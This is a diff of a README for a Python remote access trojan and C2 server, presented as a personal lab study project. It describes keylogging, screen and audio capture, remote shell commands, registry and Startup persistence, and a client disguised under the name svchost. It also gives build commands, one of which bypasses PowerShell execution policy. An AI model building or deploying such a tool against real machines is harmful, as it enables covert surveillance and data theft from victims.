@@ -11,7 +11,8 @@ Understanding how offensive tools work is fundamental to defending against them.
 - How a C2 server manages multiple victims and logs activity
 
 ## Architecture
-<img src="diagram.png" width="100%">
+
+<img src="docs/diagram.png" width="100%">
 
 The project has two sides:
 
@@ -47,62 +48,45 @@ TYPE|LENGTH|EXTRA|KEY_B64\n
 - [x] **Victim selection** — switch between victims with commands
 
 ### In progress
+- [ ] Command whitelist (security hardening)
+- [ ] Checksum validation (protocol integrity)
+- [ ] Reconnection jitter and exponential backoff
 - [ ] File download command
-- [ ] Reconnection logic
+- [ ] Multiple victim management
 
-## Usage
+## Building
 
-### Server (`server.py`)
+### Linux/Mac
 ```bash
-python server.py --host 0.0.0.0 --port 4444
+chmod +x scripts/build.sh
+./scripts/build.sh
 ```
 
-Once a victim connects:
-```
-[victim_abc123] ~ > @vics
-  - victim_abc123
-  - victim_def456
-
-[victim_abc123] ~ > @victim_def456
-[i] Switched to victim_def456
-
-[victim_def456] /tmp > screenshot
-[i] Connected: 192.168.1.100:54321 (victim_def456)
+### Windows
+```powershell
+powershell -ExecutionPolicy Bypass -File scripts/build.ps1
 ```
 
-**Commands:**
-- `@vics` — list all connected victims
-- `@victim_id` — switch to another victim
-- `screenshot` — capture victim's screen
-- `audio` — record 10 seconds of audio
-- `keylog` — collect keystrokes for 60 seconds
-- `cd path` — change directory and update prompt
-- Any shell command — execute and return output
-- `kill` — self-destruct victim client
+Binaries will be in `dist/`:
+- `svchost` — RAT client (run on victim)
+- `server` — C2 server (run on attacker)
 
-### Client (`svchost.py`)
-```bash
-python svchost.py --host <c2_server_ip> --port 4444
-```
-
-The client:
-1. Copies itself to `AppData/Microsoft/Windows/`
-2. Registers in Windows registry or Startup folder
-3. Connects to C2 server
-4. Waits for incoming commands
-5. Exfiltrates data back to server
+## Project Structure
 
 ## Project Structure
 ```
 kast-c2/
-├── svchost.py      # RAT client (victim side)
-├── server.py       # C2 server (attacker side)
-├── db.py           # SQLite helpers
-└── loot/           # Exfiltrated data (gitignored)
-    └── [victim_id]/
-        ├── screenshots/
-        ├── audios/
-        └── keylogs/
+├── scripts/
+│   ├── build.sh         # Linux/Mac build script
+│   └── build.ps1        # Windows build script
+├── docs/
+│   └── diagram.png      # Architecture diagram
+├── svchost.py           # RAT client (victim side)
+├── server.py            # C2 server (attacker side)
+├── db.py                # SQLite helpers
+├── requirements.txt     # Python dependencies
+├── LICENSE
+└── README.md
 ```
 
 ## Implementation Details
@@ -129,4 +113,5 @@ Screenshots, audio, and keystroke logs are encrypted with Fernet (symmetric encr
 Tested on Windows. Developed and studied in a controlled local lab using Docker with isolated networks.
 
 ---
+
 *Part of a personal cybersecurity studies portfolio.*
